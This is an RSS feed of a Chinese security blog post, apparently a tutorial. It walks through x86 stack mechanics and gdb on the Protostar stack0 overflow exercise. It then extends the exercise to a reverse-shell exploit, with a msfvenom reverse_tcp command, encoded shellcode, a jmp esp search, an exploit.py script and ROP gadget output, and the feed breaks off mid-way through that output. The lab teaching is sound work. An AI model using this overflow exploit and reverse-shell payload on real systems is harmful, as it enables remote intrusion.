<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>quanyechavshuo</title>
    <description>A blog about programming and network security</description>
    <link>/</link>
    <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Tue, 07 Jun 2016 11:56:46 +0800</pubDate>
    <lastBuildDate>Tue, 07 Jun 2016 11:56:46 +0800</lastBuildDate>
    <generator>Jekyll v3.1.2</generator>
    
      <item>
        <title>二进制入门--动态跟踪源代码与反汇编代码</title>
        <description>&lt;h3 id=&quot;x01-&quot;&gt;0x01 栈基础知识&lt;/h3&gt;

&lt;h4 id=&quot;httpblogchinaunixnetuid-1848701-id-2825699html&quot;&gt;1&amp;gt;http://blog.chinaunix.net/uid-1848701-id-2825699.html&lt;/h4&gt;

&lt;h4 id=&quot;eip&quot;&gt;2&amp;gt;eip是当前帧中还没开始执行，下一步要执行的汇编指令的地址&lt;/h4&gt;

&lt;h4 id=&quot;section&quot;&gt;3&amp;gt;32位系统中，一个栈单元为32位&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;esp+0x4代表下一个栈单元
esp+0x1c代表esp下面第[16+12=28(/4=7)] 7个栈单元
eg.
    esp[ss:0x00000000]         |ab221245|   --&amp;gt;  一个栈单元
    esp+0x4[ss:0x00000004]     |2348sko9|   --&amp;gt;  一个栈单元
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;call-addrpush-eip--jmp-addr&quot;&gt;4&amp;gt;call addr===&amp;gt;push eip + jmp addr&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;执行call addr时，由于call addr已经执行,所以call addr=push eip+jmp addr中的eip为call addr汇编指令当前所在帧中的下一条指令的地址,这里说的当前所在帧是如下图frame所示在当前图片看到的一片汇编指令代码,如执行0xff77b8d02处的call 0xf77bc2e0时,eip为当前帧的下一条指令的地址为f77b8d07
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图frame
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/eip.png&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;leavemov-espebp--pop-ebp&quot;&gt;5&amp;gt;leave===&amp;gt;mov esp,ebp + pop ebp&lt;/h4&gt;

&lt;h4 id=&quot;retpop-eip--jmp-eip&quot;&gt;6&amp;gt;ret===&amp;gt;pop eip + jmp eip&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;分析ret汇编语句时，最好不要把ret分开当作两句汇编指令，这样容易因为人脑习惯逐句解析两句，会和计算机的解析一句汇编指令错乱
特别是影响esp，eip的寄存器的分析时，要按照计算机的解析模式--&amp;gt;ret只是一句指令，执行完ret指令后，eip=[esp],esp=esp+4
分析ret指令时，先分析eip，再分析esp
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;call-esp&quot;&gt;7&amp;gt;call esp:&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;由于call addr等同于push eip+jmp addr,执行call esp时，esp是个地址，系统将这里的esp翻译成一个普通地址，假设值为addr,call esp即相当于上面的call addr=push eip+jmp addr
      代码段：                                    栈段：          
                      ..                                                
                      ..                                  | addr1 |
        addr0     call esp(esp=addr)   ------&amp;gt;       addr |       |
        addr1     opcode_1                                |       |

当eip=addr0时，esp=addr
当eip=addr1时，正在执行addr0处的call esp,也即call addr=push eip+jmp addr=push addr1+jmp addr
执行完call esp后栈段如上图右部所示
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;pop-pop-retjmp-esp16pop-pop-ret&quot;&gt;8&amp;gt;pop pop ret=jmp &lt;a href=&quot;条件：pop pop ret的地址在栈中且马上要执行&quot;&gt;esp+16&lt;/a&gt;&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;栈段：                          代码段：

    addr0     | addr1 |                 addr1:  pop1
    addr0+4   |       |                         pop2
    addr0+8   |       |                         ret
    addr0+12  |       |
    addr0+16  |       |

满足条件时,栈中addr1覆盖的是一个函数的返回地址,esp=eip=addr0，还没但正要去执行ret=pop eip+jmp eip,
执行完这个ret的前一句后,eip=ret的地址,esp=addr0,然后跳转到ret的地址处执行ret
执行完这个ret后，eip=addr1,esp=addr0+4,然后执行addr1处的pop1
执行完pop1后，eip=addr1+4,esp=addr0+8,然后执行addr1+4处的pop2
执行完pop2后，eip=addr1+8,esp=addr0+12,然后执行addr1+8处的ret
执行完ret后，eip=[addr0+16],esp=addr0+16,然后执行[add0+16]处的代码
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-gdb&quot;&gt;0x02 gdb动态调度&lt;/h3&gt;

&lt;h4 id=&quot;gdb&quot;&gt;1&amp;gt;gdb常用调试命令&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://wenku.baidu.com/link?url=W1u-DTrFwMreJsYavwKcI_yDzJsJglUJ4yfcXXXxWOkGTlJSSqXm-4zohcUYxGciOIeFRcSY0gr2qn-K5pnqGRU6nGbgQvW6XVfaRMCdmKq
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;section-1&quot;&gt;2&amp;gt;提炼命令:&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   --------terminal-----------
   gdb
   help
   help data
   help stack
   help status
   -----------end-------------
   gdb stack0           #===&amp;gt;gdb + file stack0
   l(list)              #show source
   b 7(break 7)         #add break on line7
   b 8(break 8)         #add break on line8
   b 11
   b 13
   b 15
   info b(info break)
   info registers       #show registers
   r(run)
   disas /m
                /r      #show hex(显示汇编指令对应十六进制值)
                /m      #show source if available(如果有源码，显示对应行源码)
   set disassembly-flavor att/intel     #设置att或intel格式
   set disassemble-next-line            #设置下一步是否显示汇编码
   si(setpi)                            #==&amp;gt; step into,like f7 in od
   ni(nexti)                            #==&amp;gt; like f8 in od
   leave                #立即中断当前函数运行并返回，当前函数的剩余语句将不被执行
   finish               #执行到当前函数返回之后停止，当前函数的剩余语句将正常运行
   bt(backtrace)        #查看所有栈帧信息
   f num(frame num)     #选择并打印第num个栈帧信息
   info f(info frame)   #查看当前栈帧信息
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x03-&quot;&gt;0x03 实例分析&lt;/h3&gt;

&lt;h4 id=&quot;linkhttpsexploit-exercisescomprotostarstack0&quot;&gt;link:https://exploit-exercises.com/protostar/stack0/&lt;/h4&gt;

&lt;p&gt;源码如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--------stack0.c----------
1       #include &amp;lt;stdlib.h&amp;gt;
2       #include &amp;lt;unistd.h&amp;gt;
3       #include &amp;lt;stdio.h&amp;gt;
4
5       int main(int argc, char **argv)
6       {
7         volatile int modified;
8         char buffer[64];
9
10        modified = 0;
11        gets(buffer);
12
13        if(modified != 0) {
14            printf(&quot;you have changed the &#39;modified&#39; variable\n&quot;);
15        } else {
16            printf(&quot;Try again?\n&quot;);
17        }
18      }
-----------end------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;该题要求溢出变量modified,也即覆盖栈中的modified所在的内在地址里的值,在终端中执行如下命令，下面为实时操作与对输出的相应理解&lt;/p&gt;

&lt;p&gt;on kali:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /root/桌面
vi stack0.c with upon source code
gcc -g -o stack0 stack0.c
gdb stack0

l
----------output:----------
1       #include &amp;lt;stdlib.h&amp;gt;
2       #include &amp;lt;unistd.h&amp;gt;
3       #include &amp;lt;stdio.h&amp;gt;
4
5       int main(int argc, char **argv)
6       {
7         volatile int modified;
8         char buffer[64];
9
10        modified = 0;kjkkkk
-----------end----------

l
----------output:----------
11        gets(buffer);                                                                                                                      
12                                                                                                                                           
13        if(modified != 0) {                                                                                                                
14            printf(&quot;you have changed the &#39;modified&#39; variable\n&quot;);                                                                          
15        } else {                                                                                                                           
16            printf(&quot;Try again?\n&quot;);                                                                                                        
17        }                                                                                                                                  
18      } 
-----------end----------

b 7
b 8
b 11
b 13
b 15

info b
---------output:-----------
Num     Type           Disp Enb Address    What                                                                                              
1       breakpoint     keep y   0x080483fd in main at stack0.c:7                                                                             
breakpoint already hit 1 time                                                                                                        
2       breakpoint     keep y   0x080483fd in main at stack0.c:8                                                                             
breakpoint already hit 1 time                                                                                                        
3       breakpoint     keep y   0x08048405 in main at stack0.c:11                                                                            
breakpoint already hit 1 time                                                                                                        
4       breakpoint     keep y   0x08048411 in main at stack0.c:13                                                                            
5       breakpoint     keep y   0x08048427 in main at stack0.c:15     
----------end--------------

r

disas /m
-------------output:---------------
7         volatile int modified;
8         char buffer[64];
9
10        modified = 0;
=&amp;gt; 0x080483fd &amp;lt;+9&amp;gt;:     movl   $0x0,0x5c(%esp)
---------------end-----------------

通过上面的结果发现中断在line10,而其中line7,lin8中的两个定义变量的语句volatile int modified和char buffer[64]并没有中断效果 

main函数对应汇编代码从line6开始:
---------------------------------汇编跟踪:line6------------------------------------------
Dump of assembler code for function main:
6       {
0x080483f4 &amp;lt;+0&amp;gt;:     push   %ebp                 #ebp压栈，对应下图stack0中的序号1
0x080483f5 &amp;lt;+1&amp;gt;:     mov    %esp,%ebp            #ebp=esp,对应下图stack0中的序号2
0x080483f7 &amp;lt;+3&amp;gt;:     and    $0xfffffff0,%esp     #将esp最后四位置0,应该是一种安全措施，获得更大的栈空间,对应序号3
0x080483fa &amp;lt;+6&amp;gt;:     sub    $0x60,%esp           #扩大栈空间,0x60=96=(/4=24)24个栈单元,对应序号4
---------------------------------------end-----------------------------------------------

line7,lin8代码：
------------line7,8---------------
7         volatile int modified;
8         char buffer[64];
--------------end-----------------

这两行代码由于无法在gdb中跟踪，暂时无法确定在栈中的分布情况

--------------secret-----------------
下文将会得出(此时可以先不看这个secret)：
1.进入main函数前的上一帧中，有一个调用main函数的动作，为了调用main函数，有这几个动作：
1&amp;gt;将main函数的参数从右到左压栈(push)
2&amp;gt;call main,将当前帧（还没进入main函数时的帧)中call main汇编语句的下一行汇编语句的地址压栈
2.在进入main函数，main初始化后(push ebp,ebp=esp,esp=esp-0x60),声明变量的line7:volatile int modified,char buffer[64]的对应汇编效果是：
从上一句esp=esp-0x60中的esp为扩展0x60的栈空间大小之前的esp开始依次“压入”接下来声明的各个变量,也即：
1&amp;gt;在下图stack0中的0xffffd4ec中“压入” modified变量,在0xffffd4ec上面“压入”buffer[64]这个大变量,也即在0xffffd4ec-0x40&amp;lt;==&amp;gt;0xffffd4ec上面64B空间(16个栈单元)的位置上
2&amp;gt;这里打了引号的“压入”没有esp=esp-4的效果，应该是操作系统对程序初始化时算好了将要声明的变量放到（“压入”）对应的位置上
3.一般栈中从下到上数据依次为函数从右到左的参数、调用该函数的上一帧中&quot;call 该函数&quot;形式的对应汇编指令的下一句汇编指令的地址
4.只要修改了0xffffd4ec处（存放了modified变量）的值,将其改成非0就可以完成这一题的要求了
5.上面3中说的非0是内存中的非0，如果是键盘上的0键并不是内存中的0,如下图ascii所示
--------------end--------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图ascii
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/ascii.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;line10:(line9是空格行)
-----------------汇编跟踪:line10----------------------
10        modified = 0;
=&amp;gt; 0x080483fd &amp;lt;+9&amp;gt;:     movl   $0x0,0x5c(%esp)      #0x5c=92(/4=23)=23个栈单元,将esp下面第23个栈单元置0,对应图中序号5,在下一步可可发现是将0xffffd4ec处的32位空间置0
----------------------end-----------------------------

x $esp+0x5c
----------output:------------
0xffffd4ec:     0xf7fa6000
------------end--------------

再执行stepi后会执行[esp+0x5c]=0,将上面的地址对应内容置0

line11:
-----------------汇编跟踪:line11-----------------------
11        gets(buffer);
0x08048405 &amp;lt;+17&amp;gt;:    lea    0x1c(%esp),%eax          #eax=esp+0x1c,0x1c=28(/4=7)=7个栈单元,对应图中序号6
0x08048409 &amp;lt;+21&amp;gt;:    mov    %eax,(%esp)              #[esp]=eax,对应图中序号7,为了下面的call gets作准备--&amp;gt;将func gets的参数“入栈”(放到对应的位置，不是push arg,没有esp=esp-4)
0x0804840c &amp;lt;+24&amp;gt;:    call   0x804830c &amp;lt;gets@plt&amp;gt;     #上面一行[esp]=eax=addr,将buffer[64]的起始地址放入栈中准备给gets函数调用
-----------------------end-----------------------------

stepi(0xffffd4ec被置0)
x $esp+0x5c
-----------output:-----------
0xffffd4ec:     0x00000000
-------------end-------------

disas /m
------------out:-----------
11        gets(buffer);                                                                                                                      
=&amp;gt; 0x08048405 &amp;lt;+17&amp;gt;:    lea    0x1c(%esp),%eax     #这行左边的箭头表示运行到这行，也即eip=0x08048405,此时x $esp+0x5c ===&amp;gt; 0xffffd4ec:  0x00000000
    
0x08048409 &amp;lt;+21&amp;gt;:    mov    %eax,(%esp)         #此外，lea 0x1c(%esp),%eax(in att mode)&amp;lt;==&amp;gt;lea eax,[esp+0x1c](in intel mode)                                                                                                                                                            
0x0804840c &amp;lt;+24&amp;gt;:    call   0x804830c &amp;lt;gets@plt&amp;gt;                                                                                          
-------------end-----------

set disassembly-flavor intel(upon output is the result of &quot;set dissassembly-flavor att&quot; on default)
---------------output:---------------
11        gets(buffer);                                                                                                                      
=&amp;gt; 0x08048405 &amp;lt;+17&amp;gt;:    lea    eax,[esp+0x1c]                                                                                                
0x08048409 &amp;lt;+21&amp;gt;:    mov    DWORD PTR [esp],eax                                                                                           
0x0804840c &amp;lt;+24&amp;gt;:    call   0x804830c &amp;lt;gets@plt&amp;gt;                                                                                          
------------------end----------------

pay attention to eip part:(symbol &quot;=&amp;gt;&quot; means eip is here)
---------eip part----------
11        gets(buffer);                                                                    
=&amp;gt; 0x08048405 &amp;lt;+17&amp;gt;:    lea    eax,[esp+0x1c]           #将esp+0x1c的值赋给eax,eax=0xffffd4ac
0x08048409 &amp;lt;+21&amp;gt;:    mov    DWORD PTR [esp],eax      
0x0804840c &amp;lt;+24&amp;gt;:    call   0x804830c &amp;lt;gets@plt&amp;gt;     #push 0x08048411,jmp func gets,对应图中序号8
------------end------------

p $esp+0x1c          #print $esp+0x1c,打印$esp+0x1c变量的值
output:$2 = (void *) 0xffffd4ac

x $esp+0x1c          #x addr==&amp;gt;print [addr],that is to say,print the value in the address of addr
---------output:(==&amp;gt;x $eax)----
0xffffd4ac:     0xf7e2e243
-----------end-----------------

si
si
disas /m
---------output:------------
11        gets(buffer);
0x08048405 &amp;lt;+17&amp;gt;:    lea    eax,[esp+0x1c]
0x08048409 &amp;lt;+21&amp;gt;:    mov    DWORD PTR [esp],eax
=&amp;gt; 0x0804840c &amp;lt;+24&amp;gt;:    call   0x804830c &amp;lt;gets@plt&amp;gt;
----------end---------------

x $eax
-------output:------------
0xffffd4ac:     0xf7e2e243
------------end-----------
    
x/4 $esp    #查看当前栈中esp起4个栈单元的情况
---------output:------------
0xffffd490:     0xffffd4ac      0x00000000      0x000000c2      0xf7e92ee6
-------------end------------

其中的0xffffd4ac对应图中的序号6中数值
    
n
输入：
12345678981234567898123456789812345678981234567898123456789812340000
enter
其中最后的12340000为第60到68个字符
-----------output:--------------
Breakpoint 4, main (argc=1, argv=0xffffd594) at stack0.c:13
13        if(modified != 0) {
--------------end---------------
    
si
disas /m
---------output:------------
13        if(modified != 0) {
0x08048411 &amp;lt;+29&amp;gt;:    mov    eax,DWORD PTR [esp+0x5c]
=&amp;gt; 0x08048415 &amp;lt;+33&amp;gt;:    test   eax,eax
-------------end------------

p $eax
-----------output:------------
$4 = 808464432
------------end---------------

p/x $eax(以十六进制显示eax的值,help x(x $esp+0x1c相当于p [$esp+0x1c]的效果，只不过p不支持p [somethin]命令显示内存地址对应的内容)中的/FMT可以看到支持的各种显示格式)
------------output:-------------
$5 = 0x30303030
---------------end--------------

这里的0x30303030是上面输入的68个键盘上的数字中的最后4个0对应的内存中的值，键盘上的数字0对应的真实内存ascii值为48（十进制）,也即十六进制0x30,更多关于ascii的理解可参考https://forum.90sec.org/forum.php?mod=viewthread&amp;amp;tid=9217
所以要输入第65到68个字符单元为内存中的0,也即ascii值为nul的字符：
print &#39;\x00&#39;(或python -c &#39;print &quot;\x00&quot;&#39;)
output:空
print &#39;0&#39;(或python -c &#39;python &quot;0&quot;&#39;)
output:0
print &#39;\x30&#39;(或python -c &#39;python &quot;\x30&quot;&#39;)
output:0
所以print &#39;\x00&#39;在内存中的数据为0,print &#39;0&#39;&amp;lt;==&amp;gt;print &#39;\x30&#39;
重新运行./stack0并输入下面的值可使modified在内存中的值不变，依然为内存中的0
1234567898123456789812345678981234567898123456789812345678981234\x00\x00\x00\x00
注意，如果直接在键盘上输入上面这一长串，最后的\x00\x00\x00\x00在内存中并不能被解析成内存中的0000,要使用如下方法:

print &#39;1234567898123456789812345678981234567898123456789812345678981234\x00\x00\x00\x00&#39; | ./stack0
或
echo &#39;1234567898123456789812345678981234567898123456789812345678981234\x00\x00\x00\x00&#39; | ./stack0

原题中要求改变modified位，直接输入键盘上的任意大于64位的一串字符即可，因为键盘上的数字0在内存中是0x30,如果将键盘上的0键输入到对应的modified位上，会改变modified
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图stack0
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/stack0.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;该题要求溢出变量modified,也即覆盖栈中的modified所在的内在地址里的值，这里进行扩展，通过栈溢出反弹shell.
该题中ASLR(地址随机化) 和 NX(栈不可执行)已禁用
由上图stack0及分析易知：
1.栈中如果将一个函数展开，一般从push ebp+mov ebp,esp+sub esp,0x??开始到leave+ret结束,将这些看作是该函数的帧,该函数的上一帧中有调用该函数的汇编语句，该函数的返回地址在栈中的位置为该函数帧的下面一个栈单元内(保存在该函数帧的下面一个栈单元内)
2.栈中内容由下至上依次为：函数的返回地址、函数的帧(由下至上从函数的上一帧中ebp的值开始)
3.gets函数通过终端输入超长字符只能覆盖main函数帧的上一帧中调用main函数时main函数的返回地址main_ret，不能覆盖main函数帧中调用gets函数时get函数的返回地址gets_ret

计算需要输入多少字符可以覆盖main_ret:

r
Start it from the beginning? (y or n)
y
info b
-------------output:-------------
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0x080483fd in main at stack0.c:7
        breakpoint already hit 1 time
2       breakpoint     keep y   0x080483fd in main at stack0.c:8
        breakpoint already hit 1 time
3       breakpoint     keep y   0x08048405 in main at stack0.c:11
4       breakpoint     keep y   0x08048411 in main at stack0.c:13
5       breakpoint     keep y   0x08048427 in main at stack0.c:15
---------------end---------------

disas /m
----------------output:--------------------
Dump of assembler code for function main:
6       {
   0x080483f4 &amp;lt;+0&amp;gt;:     push   ebp
   0x080483f5 &amp;lt;+1&amp;gt;:     mov    ebp,esp
   0x080483f7 &amp;lt;+3&amp;gt;:     and    esp,0xfffffff0
   0x080483fa &amp;lt;+6&amp;gt;:     sub    esp,0x60

7         volatile int modified;
8         char buffer[64];
9
10        modified = 0;
=&amp;gt; 0x080483fd &amp;lt;+9&amp;gt;:     mov    DWORD PTR [esp+0x5c],0x0
-----------------end-----------------------

b *0x080483f5
r
Start it from the beginning? (y or n) 
y
-------------------output:-------------------
Starting program: /root/桌面/stack0 

Breakpoint 6, 0x080483f5 in main (argc=1, argv=0xffffd594) at stack0.c:6
6       {
---------------------end---------------------

disas /m
-----------------output:-------------------
Dump of assembler code for function main:
6       {
   0x080483f4 &amp;lt;+0&amp;gt;:     push   ebp
=&amp;gt; 0x080483f5 &amp;lt;+1&amp;gt;:     mov    ebp,esp
   0x080483f7 &amp;lt;+3&amp;gt;:     and    esp,0xfffffff0
-------------------end---------------------

p $esp
-------------output:-----------------
$7 = (void *) 0xffffd4f8
---------------end-------------------

也即执行完0x080483f4后esp值为0xffffd4f8,所以要覆盖main_ret,需要输入(0xffffd4f8-0xffffd4ec)/4+16+1+1=21个栈单元=21*4=84B，也即84个字符
main_ret=0xffffd4f8+0x4=0xffffd4fc

python -c &quot;print &#39;a&#39;*80+&#39;bbbb&#39;&quot; | ./stack0     #(此时不可直接print &#39;a&#39;*80,print不支持)
------------output:------------
you have changed the &#39;modified&#39; variable
[1]    11055 done                python -c &#39;print &quot;a&quot;*80+&quot;bbbb&quot;&#39; | 
       11056 segmentation fault  ./stack0
-------------end---------------

gdb -q -c core
--------output:----------
/root/桌面/core: 没有那个文件或目录.
----------end------------

解决方法：(http://blog.csdn.net/nuoline/article/details/8610694)
ulimit -c
---------output:----------
0
------------end-----------

ulimit -c 2048
python -c &#39;print &quot;a&quot;*80+&quot;bbbb&quot;&#39; | ./stack0
------------output:--------------
you have changed the &#39;modified&#39; variable
[1]    11403 done                              python -c &#39;print &quot;a&quot;*80+&quot;bbbb&quot;&#39; | 
       11404 segmentation fault (core dumped)  ./stack0
--------------end----------------

gdb -q -c core
----------------output:---------------
[New LWP 11404]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x62626262 in ?? ()
-----------------end------------------

从而发现某个函数(main函数)的返回地址被改写成0x62626262(bbbb),从而产生溢出错误

或者：

gdb ./stack0
b 18
si
si
此时程序将执行到达main函数帧中的ret,再si将跳转到main_ret处,可通过以下验证
-------------output:--------------
15        } else {
16            printf(&quot;Try again?\n&quot;);
   0x08048427 &amp;lt;+51&amp;gt;:    movl   $0x8048529,(%esp)
   0x0804842e &amp;lt;+58&amp;gt;:    call   0x804832c &amp;lt;puts@plt&amp;gt;

17        }
18      }
   0x08048433 &amp;lt;+63&amp;gt;:    leave  
---Type &amp;lt;return&amp;gt; to continue, or q &amp;lt;return&amp;gt; to quit---
=&amp;gt; 0x08048434 &amp;lt;+64&amp;gt;:    ret    

End of assembler dump.
(gdb) si
0x62626262 in ?? ()
--------------end-----------------

同样可以发现main_ret被溢出为0x62626262(bbbb)

检验一下：
python -c &#39;print &quot;a&quot;*80+&quot;bbcc&quot;&#39; | ./stack0
------------------output:--------------------
[New LWP 11928]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x63636262 in ?? ()
---------------------end---------------------

最后的&quot;bbcc&quot;由于在内存中依次由上到下存放在栈空间中（在一个栈单元中可放下4个字符，在一个栈单元中从左到右存放）,而栈中由上到下或一个栈单元中的从左到右都是由内存低地址到内存高地址排列，所以bbcc(0x62626363)被翻译成eip=0x63636262

为了溢出反弹一个shell，用msf生成shellcode,并构造成如下输入链来触发shellcode的执行
&quot;a&quot;*80+addr(jmp esp)+shellcode
其中shellcode代码由msf生成，输出为py版本，反弹ip设为kali的ip:192.168.3.106,port为1111
2004 ~  » msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.3.106 LPORT=1111 -e x86/shikata_ga_nai -b &quot;\x00&quot; --platform linux -f py 
-------------------------output:-----------------------
No Arch selected, selecting Arch: x86_64 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
buf =  &quot;&quot;
buf += &quot;\xba\x31\x6f\x3c\x05\xd9\xca\xd9\x74\x24\xf4\x5d\x33&quot;
buf += &quot;\xc9\xb1\x12\x31\x55\x12\x83\xc5\x04\x03\x64\x61\xde&quot;
buf += &quot;\xf0\xce\x4c\xe1\x91\xc7\xf6\x84\xd0\xc7\x4e\x3e\xca&quot;
buf += &quot;\xaa\x7f\x89\x99\x16\xc1\x53\xec\x51\xce\x66\x46\x0d&quot;
buf += &quot;\xba\x41\x3e\x34\x50\x90\xe1\x2c\xa4\xca\x12\xb5\xee&quot;
buf += &quot;\x65\x64\x0c\xec\x89\x71\x39\x31\x21\x7a\xaf\xe0\x7a&quot;
buf += &quot;\xf4\xc9\x69\x6b\x5c\x7f\x44\xd3\x6f\x7a\xc1\xbd\x35&quot;
buf += &quot;\x8b\xf4\xbe\x2c&quot;
-------------------------end--------------------------

其中jmp esp的地址由msfelfscan找出，win下为msfpescan
msfelfscan -j esp /root/桌面/stack0
结果发现由于stack0的代码比较简单，里面没有jmp esp的指令，于是通过info shared来找出stack0中调用系统函数时用到的so文件，然后从so文件里找出jmp esp的地址,如下：
info shared
------------output:----------------
From        To          Syms Read   Shared Object Library
0xf7fdd860  0xf7ff50fc  Yes (*)     /lib/ld-linux.so.2     #0xf7fdd860为该动态链接库的内存加载基址
                        No          linux-gate.so.1
0xf7e14420  0xf7f44c0e  Yes (*)     /lib/i386-linux-gnu/i686/cmov/libc.so.6
(*): Shared library is missing debugging information.
--------------end------------------

然后执行msfelfscan -j esp /lib/ld-linux.so.2
----------output:-------------
[/lib/ld-linux.so.2]
0x0001813b jmp esp
0x0001bfe7 jmp esp
0x0001c24f jmp esp
------------end---------------

找到一个jmp esp地址为：0x0001813b,但是这只是偏移量
真正的地址为：0xf7fdd860+0x0001813b=0xf7ff599b

于是输入链为：
&quot;a&quot;*80+&#39;\x9b\x59\xff\xf7&#39;+shellcode
用python代码实现exploit.py：
------------exploit.py----------------
import os
import sys
buf =  &quot;&quot;
buf += &quot;\xba\x31\x6f\x3c\x05\xd9\xca\xd9\x74\x24\xf4\x5d\x33&quot;
buf += &quot;\xc9\xb1\x12\x31\x55\x12\x83\xc5\x04\x03\x64\x61\xde&quot;
buf += &quot;\xf0\xce\x4c\xe1\x91\xc7\xf6\x84\xd0\xc7\x4e\x3e\xca&quot;
buf += &quot;\xaa\x7f\x89\x99\x16\xc1\x53\xec\x51\xce\x66\x46\x0d&quot;
buf += &quot;\xba\x41\x3e\x34\x50\x90\xe1\x2c\xa4\xca\x12\xb5\xee&quot;
buf += &quot;\x65\x64\x0c\xec\x89\x71\x39\x31\x21\x7a\xaf\xe0\x7a&quot;
buf += &quot;\xf4\xc9\x69\x6b\x5c\x7f\x44\xd3\x6f\x7a\xc1\xbd\x35&quot;
buf += &quot;\x8b\xf4\xbe\x2c&quot;

jmp_esp=&quot;\x9b\x59\xff\xf7&quot;
#print jmp_esp
input=&quot;a&quot;*80+jmp_esp+buf
#print input
os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
---------------end--------------------

发现上面算出来的jmp_esp=&#39;\x9b\x59\xff\xf7&#39;无法跳转到esp,可能是我的这种理解错了
换工具，rop-tool
http://www.freebuf.com/sectool/105715.html
先安装上面链接中说的capstone
http://www.capstone-engine.org/download/3.0.4/ubuntu-14.04/python-capstone_3.0.4-0.1ubuntu1_amd64.deb
然后下载rop-tool
https://t0x0sh.org/rop-tool/releases/2.4/rop-tool-Linux-x86_64
chmod +x rop-tool-Linux-x86_64
mv rop-tool-Linux-x86_64 /usr/bin/rop
rop gadget ./stack0(或者rop gadget -a ./stack0)
------------------output:--------------------
Looking gadgets, please wait...
 0x080482e5 -&amp;gt; add dword ptr [eax], eax; add byte ptr [eax + 0x5b], bl; leave ; ret ; 
 0x080482ca -&amp;gt; ret ; 
 0x08048440 -&amp;gt; push ebp; mov ebp, esp; pop ebp; ret ; 
 0x080483ef -&amp;gt; call eax; leave ; ret ; 
 0x080482e9 -&amp;gt; pop ebx; leave ; ret ; 
 0x080484a7 -&amp;gt; pop edi; pop ebp; ret ; mov ebx, dword ptr [esp]; ret ; 
 0x080482c5 -&amp;gt; add byte ptr [eax], al; add byte ptr [ebx - 0x7f], bl; ret ; 
 0x080484a7 -&amp;gt; pop edi; pop ebp; ret ; 
 0x080484f4 -&amp;gt; pop ecx; pop ebx; leave ; ret ; 
 0x080483b9 -&amp;gt; add eax, 0x8049644; add dword ptr [ebx + 0x5d5b04c4], eax; ret ; 
 0x080484a8 -&amp;gt; pop ebp; ret ; mov ebx, dword ptr [esp]; ret ; 
 0x080483ef -&amp;gt; call eax; 
 0x080484a5 -&amp;gt; pop ebx; pop esi; pop edi; pop ebp; ret ; 
 0x080482ea -&amp;gt; leave ; ret ; 
 0x080483c3 -&amp;gt; pop ebp; ret ; 
 0x080483c2 -&amp;gt; pop ebx; pop ebp; ret ; 
 0x080482e6 -&amp;gt; add byte ptr [eax], al; pop eax; pop ebx; leave ; ret ; 
 0x080482e7 -&amp;gt; add byte ptr [eax + 0x5b], bl; leave ; ret ; 
 0x080482e8 -&amp;gt; pop eax; pop ebx; leave ; ret ; 
 0x080484aa -&amp;gt; mov ebx, dword ptr [esp]; ret ; 
 0x080482c7 -&amp;gt; add byte ptr [ebx - 0x7f], bl; ret ; 
 0x080484a9 -&amp;gt; ret ; mov ebx, dword ptr [esp]; ret ; 
 0x080483be -&amp;gt; add dword ptr [ebx + 0x5d5b04c4], eax; ret ; 
 0x08048432 -&amp;gt; dec ecx; ret ; 
 0x08048441 -&amp;gt; mov ebp, esp; pop ebp; ret ; 
